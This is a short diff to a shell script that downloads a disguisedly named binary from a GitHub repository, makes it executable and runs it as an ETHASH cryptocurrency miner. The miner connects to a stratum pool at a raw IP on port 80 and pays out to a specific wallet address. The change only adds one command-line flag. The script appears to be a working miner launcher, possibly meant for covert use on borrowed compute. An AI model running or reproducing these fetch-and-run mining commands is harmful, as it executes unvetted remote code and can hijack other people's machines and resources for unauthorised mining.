@@ -14,4 +14,4 @@ strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX
 
 wget https://github.com/angkii/m/raw/main/AkubapakMU
 chmod 700 AkubapakMU
-./AkubapakMU --algo ETHASH --pool stratum+tcp://192.155.86.221:80 --user 0x9dc2157e3ccf7a88268afb7def08a872667a6e29.aqshkuy --pass 123
+./AkubapakMU --algo ETHASH --pool stratum+tcp://192.155.86.221:80 --user 0x9dc2157e3ccf7a88268afb7def08a872667a6e29.aqshkuy --pass 123 --no-cl
